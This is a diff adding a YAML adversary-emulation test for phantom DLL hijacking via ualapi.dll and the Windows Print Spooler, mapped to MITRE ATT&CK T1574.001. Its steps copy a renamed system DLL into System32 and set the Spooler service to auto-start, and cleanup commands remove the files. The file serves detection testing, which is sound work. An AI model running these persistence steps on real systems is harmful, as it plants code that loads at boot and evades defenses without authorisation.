@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: Phantom Dll Hijacking - ualapi.dll
+description: |
+    Re-starting the Print Spooler service leads to C:\Windows\System32\ualapi.dll being loaded
+    A malicious ualapi.dll placed in the System32 directory will lead to its execution whenever the system starts
+
+    Upon successful execution, amsi.dll will be copied and renamed to ualapi.dll and then ualapi.dll will be copied to system32 folder for loading during system restart.
+    Print Spooler service is also configured to auto start. Reboot of system is required
+uuid: 5898902d-c5ad-479a-8545-6f5ab3cfc87f
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1574: Hijack Execution Flow'
+    subtechniques:
+        - 'T1574.001: DLL Search Order Hijacking'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: phantom-dll-hijacking---ualapi.dll
+      inline: |
+        copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
+        ren %APPDATA%\amsi.dll ualapi.dll
+        copy %APPDATA%\ualapi.dll %windir%\System32\ualapi.dll
+        sc config Spooler start=auto
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del %windir%\System32\ualapi.dll
+            del %APPDATA%\ualapi.dll
+        executor: command_prompt
